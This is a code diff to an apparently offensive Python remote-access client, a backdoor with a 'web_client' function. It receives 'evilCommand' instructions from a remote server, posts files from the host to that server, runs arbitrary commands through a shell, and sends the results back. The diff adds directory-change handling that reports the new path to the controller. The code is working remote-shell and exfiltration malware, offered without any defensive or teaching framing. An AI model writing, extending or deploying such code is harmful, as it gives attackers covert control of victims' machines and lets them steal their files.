@@ -29,10 +29,18 @@ def web_client():
                 fileObject = {"file": data}
                 r = requests.post(url_toProcessFile,files=fileObject)
                 
-                
-             
             else:
                 postResponse = requests.post(URL_STRING,data="File Not Found")
+
+        elif 'cd' in evilCommand:
+            cdString,destinationPath = evilCommand.split("*")
+            try:
+                os.chdir(destinationPath)
+                newDir = os.getcwd()
+                r = requests.post(URL_STRING,data="cd to "+newDir)
+                
+            except Exception as error:
+                r = requests.post(URL_STRING,data=error)
         
         else:
             shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
